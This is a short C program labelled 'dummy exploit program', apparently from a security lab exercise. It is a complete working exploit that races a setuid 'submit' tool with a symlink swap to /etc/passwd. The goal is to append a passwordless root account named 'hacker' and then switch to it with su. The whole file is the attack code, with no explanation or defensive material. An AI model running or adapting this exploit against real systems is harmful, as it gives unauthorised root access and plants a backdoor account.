/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{

  char *args[4];
  char *env[1];
	pid_t pid;

	int status;

  FILE *file;

	struct stat st;
	int originalSize;
	int newSize;
	int i = 0;

	//make a log file and empty file to submit
 	file = fopen("file.txt", "w");
	fclose(file);

	file = fopen("log.txt", "w");
	fclose(file);

 	stat("/etc/passwd", &st);
	newSize = originalSize = st.st_size;
	
	//loop until the size of the password file changes
	while (newSize == originalSize){
		
		i++;
	
		//delete the old symlink, symlink to file I own
		remove("/home/user/submit.log");
		if (symlink("log.txt", "/home/user/submit.log") < 0){
			fprintf(stderr, "symlink failed\n");
		}

	 	pid = fork();


		if (pid > 0) {
			// parent

			system("/usr/local/bin/submit file.txt hacker::0:0:hacker::/bin/bash");

			waitpid(pid, &status, 0);
			printf("Attempt: %d \n", i);

		 	stat("/etc/passwd", &st);
			newSize = st.st_size;

			
		}	

		else {

		  // child

			//sleep here
			nanosleep((struct timespec[]){{0, 2000}}, NULL);
			
			//remove old symlink, symlink to etc/passwd
			remove("/home/user/submit.log");
			if (symlink("/etc/passwd", "/home/user/submit.log") < 0){
					fprintf(stderr, "symlink failed\n");
			}
			
			return 0;

		}

	}

	//Done, su to root user

	system("su hacker");
	
	exit(0);
}

